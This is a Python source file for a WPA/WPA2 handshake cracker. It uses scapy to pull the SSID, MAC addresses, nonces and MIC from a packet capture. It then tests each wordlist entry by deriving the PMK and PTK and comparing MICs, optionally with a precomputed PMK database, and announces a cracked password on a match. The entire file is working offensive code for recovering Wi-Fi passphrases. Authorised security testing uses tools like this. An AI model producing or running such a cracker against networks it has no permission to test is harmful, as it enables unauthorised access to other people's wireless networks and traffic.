import sys
import binascii
import hashlib
import hmac
import argparse
import sqlite3
import os
from scapy.all import rdpcap, EAPOL, Dot11, Dot11Beacon, Dot11ProbeResp

try:
    from termcolor import colored
except ImportError:
    def colored(s, *args, **kwargs): return s

def get_pmk_from_db(dbfile, ssid, password):
    if not dbfile or not os.path.isfile(dbfile):
        return None
    try:
        conn = sqlite3.connect(dbfile)
        c = conn.cursor()
        c.execute("SELECT id FROM ssids WHERE ssid=?", (ssid,))
        ssid_row = c.fetchone()
        if not ssid_row:
            return None
        ssid_id = ssid_row[0]
        c.execute("SELECT id FROM passwords WHERE password=?", (password,))
        pass_row = c.fetchone()
        if not pass_row:
            return None
        pass_id = pass_row[0]
        c.execute("SELECT pmk FROM pmks WHERE ssid_id=? AND password_id=?", (ssid_id, pass_id))
        r = c.fetchone()
        if r:
            return bytes.fromhex(r[0])
        return None
    except Exception:
        return None

def get_ssid(packets):
    for pkt in packets:
        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            try:
                ssid = pkt.info.decode(errors='ignore')
                if ssid:
                    return ssid
            except Exception:
                continue
    return None

def zero_mic(eapol_raw):
    if len(eapol_raw) >= 97:
        return eapol_raw[:81] + b'\x00' * 16 + eapol_raw[97:]
    else:
        return eapol_raw

def extract_handshake_info(filename):
    packets = rdpcap(filename)
    ssid = get_ssid(packets)
    if not ssid:
        print(colored("[!] SSID not found! SSID is required.", "red"))
        sys.exit(2)

    eapols = []
    for pkt in packets:
        if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
            dot11 = pkt.getlayer(Dot11)
            eapol = pkt.getlayer(EAPOL)
            eapol_raw = bytes(eapol)
            if len(eapol_raw) < 95:
                continue
            key_info = int.from_bytes(eapol_raw[5:7], 'big')
            mic_present = (key_info & (1 << 8)) != 0
            ack = (key_info & (1 << 7)) != 0
            install = (key_info & (1 << 6)) != 0
            descriptor_version = key_info & 0b111
            replay_counter = int.from_bytes(eapol_raw[9:17], 'big')
            nonce = eapol_raw[17:49].hex()
            mic_val = eapol_raw[81:97].hex()
            src = dot11.addr2
            dst = dot11.addr1
            bssid = dot11.addr3
            eapols.append({
                "eapol_raw": eapol_raw,
                "src": src,
                "dst": dst,
                "bssid": bssid,
                "mic_present": mic_present,
                "ack": ack,
                "install": install,
                "descriptor_version": descriptor_version,
                "replay_counter": replay_counter,
                "nonce": nonce,
                "mic": mic_val,
            })

    # Try to find correct handshake pair: Message 1 (ANonce, no MIC) and Message 2/4 (SNonce, with MIC)
    handshake = None
    for i, pkt2 in enumerate(eapols):
        if pkt2["mic_present"] and not pkt2["install"]:  # Message 2 of 4
            for j in range(i-1, -1, -1):
                pkt1 = eapols[j]
                if (not pkt1["mic_present"] and pkt1["ack"] and not pkt1["install"] and
                    pkt1["replay_counter"] == pkt2["replay_counter"] and
                    pkt1["src"] == pkt2["dst"] and pkt1["dst"] == pkt2["src"]):
                    # Found matching Message 1
                    handshake = (pkt1, pkt2)
                    break
            if handshake:
                break

    # Fallback: try Message 4 (mic_present, install)
    if not handshake:
        for i, pkt2 in enumerate(eapols):
            if pkt2["mic_present"] and pkt2["install"]:  # Message 4 of 4
                for j in range(i-1, -1, -1):
                    pkt1 = eapols[j]
                    if (not pkt1["mic_present"] and pkt1["ack"] and not pkt1["install"] and
                        pkt1["replay_counter"] == pkt2["replay_counter"] and
                        pkt1["src"] == pkt2["dst"] and pkt1["dst"] == pkt2["src"]):
                        handshake = (pkt1, pkt2)
                        break
                if handshake:
                    break

    if not handshake:
        print(colored("[!] Failed to extract all required handshake parameters (no matching EAPOL pairs).", "red"))
        sys.exit(3)

    pkt1, pkt2 = handshake
    ap_mac = pkt1["src"]
    client_mac = pkt2["src"]
    anonce = pkt1["nonce"]
    snonce = pkt2["nonce"]
    mic = pkt2["mic"]
    key_descriptor_version = pkt2["descriptor_version"]

    # zero MIC field
    eapol_clean = zero_mic(pkt2["eapol_raw"])
    length = int.from_bytes(eapol_clean[2:4], 'big')
    total_len = 4 + length
    if total_len <= len(eapol_clean):
        eapol_clean = eapol_clean[:total_len]
    eapol2or4_raw = eapol_clean

    print(colored("=========================================", "grey", "on_white"))
    print(colored("  [*] Handshake Extraction  ", "red", attrs=["reverse", "bold"]))
    print(colored("                       ", "grey", "on_white"))
    print(colored("=========================================", "grey", "on_white"))
    print(colored(f"SSID: {ssid}", "cyan"))
    print(colored(f"AP MAC (BSSID): {ap_mac}", "cyan"))
    print(colored(f"Client MAC (STA): {client_mac}", "cyan"))
    print(colored(f"ANonce: {anonce}", "cyan"))
    print(colored(f"SNonce: {snonce}", "cyan"))
    print(colored(f"MIC: {mic}", "cyan"))
    print(colored(f"EAPOL (msg 2 or 4, raw hex, MIC zeroed):", "cyan"))
    print(binascii.hexlify(eapol2or4_raw).decode())
    print(colored("\n[+] Extraction complete. Initiating brute-force protocol...", "magenta", attrs=["bold"]))
    return {
        "ssid": ssid,
        "ap_mac": ap_mac,
        "client_mac": client_mac,
        "anonce": anonce,
        "snonce": snonce,
        "mic": mic,
        "eapol_raw": eapol2or4_raw,
        "key_descriptor_version": key_descriptor_version
    }

def customPRF512(key, A, B):
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) // 160):
        hmacsha1 = hmac.new(key, A + b'\x00' + B + bytes([i]), hashlib.sha1)
        R += hmacsha1.digest()
        i += 1
    return R[:blen]

def crack_passphrase_wpa(params, passphrase, debug=True, pmk_dbfile=None):
    ssid = params["ssid"]
    ap_mac = binascii.unhexlify(params["ap_mac"].replace(":", ""))
    client_mac = binascii.unhexlify(params["client_mac"].replace(":", ""))
    anonce = binascii.unhexlify(params["anonce"])
    snonce = binascii.unhexlify(params["snonce"])
    mic = params["mic"]
    eapol = bytearray(params["eapol_raw"])

    pmk = None
    if pmk_dbfile:
        pmk = get_pmk_from_db(pmk_dbfile, ssid, passphrase)
    if pmk is None:
        pmk = hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), 4096, 32)
    B = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(anonce, snonce) + max(anonce, snonce)
    ptk = customPRF512(pmk, b"Pairwise key expansion", B)
    mic_calc = hmac.new(ptk[:16], eapol, hashlib.md5).digest()[:16]
    mic_hex = mic_calc.hex()[:32]
    if debug:
        print(colored(f"[DEBUG][WPA] Trying passphrase: {passphrase}", "yellow"))
        print(colored(f"        Calculated MIC: {mic_hex}", "blue"))
        print(colored(f"        Expected MIC:   {mic.lower()}", "blue"))
    return mic_hex == mic.lower()

def crack_passphrase_wpa2(params, passphrase, debug=True, pmk_dbfile=None):
    ssid = params["ssid"]
    ap_mac = binascii.unhexlify(params["ap_mac"].replace(":", ""))
    client_mac = binascii.unhexlify(params["client_mac"].replace(":", ""))
    anonce = binascii.unhexlify(params["anonce"])
    snonce = binascii.unhexlify(params["snonce"])
    mic = params["mic"]
    eapol = bytearray(params["eapol_raw"])

    pmk = None
    if pmk_dbfile:
        pmk = get_pmk_from_db(pmk_dbfile, ssid, passphrase)
    if pmk is None:
        pmk = hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), 4096, 32)
    B = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(anonce, snonce) + max(anonce, snonce)
    ptk = customPRF512(pmk, b"Pairwise key expansion", B)
    mic_calc = hmac.new(ptk[:16], eapol, hashlib.sha1).digest()[:16]
    mic_hex = mic_calc.hex()[:32]
    if debug:
        print(colored(f"[DEBUG][WPA2] Trying passphrase: {passphrase}", "yellow"))
        print(colored(f"        Calculated MIC: {mic_hex}", "blue"))
        print(colored(f"        Expected MIC:   {mic.lower()}", "blue"))
    return mic_hex == mic.lower()

def identify_encryption_type(params):
    ver = params.get("key_descriptor_version", None)
    if ver == 1:
        return "WPA"
    elif ver in (2, 3):
        return "WPA2"
    else:
        return "UNKNOWN"

def main():
    parser = argparse.ArgumentParser(description="WPA/WPA2 handshake extract & passphrase check tool")
    parser.add_argument("handshake", help="Handshake .pcap file")
    parser.add_argument("-P", "--wordlist", help="Wordlist file to use", required=True)
    parser.add_argument("-r", "--pmk-db", help="SQLite PMK database (airvault.db format)", default=None)
    args = parser.parse_args()

    params = extract_handshake_info(args.handshake)
    enc_type = identify_encryption_type(params)
    print(colored(f"\nIdentified Encryption Type: {enc_type}", "magenta", attrs=["bold"]))

    with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as f:
        found = False
        attempt = 0
        for line in f:
            password = line.strip()
            attempt += 1
            print(colored(f"[*] [{attempt:04d}] Password Probe: {password}", "magenta"))
            if enc_type == "WPA":
                result = crack_passphrase_wpa(params, password, pmk_dbfile=args.pmk_db)
            elif enc_type == "WPA2":
                result = crack_passphrase_wpa2(params, password, pmk_dbfile=args.pmk_db)
            else:
                result = crack_passphrase_wpa2(params, password, pmk_dbfile=args.pmk_db) or \
                         crack_passphrase_wpa(params, password, pmk_dbfile=args.pmk_db)
            if result:
                print(colored(f"\n[!!!] PASSWORD CRACKED: >>> {password} <<<", "green", attrs=["reverse", "bold"]))
                found = True
                break
        if not found:
            print(colored("\n[-] Password not found in wordlist. Operation failed.", "red", attrs=["reverse", "bold"]))

if __name__ == "__main__":
    main()
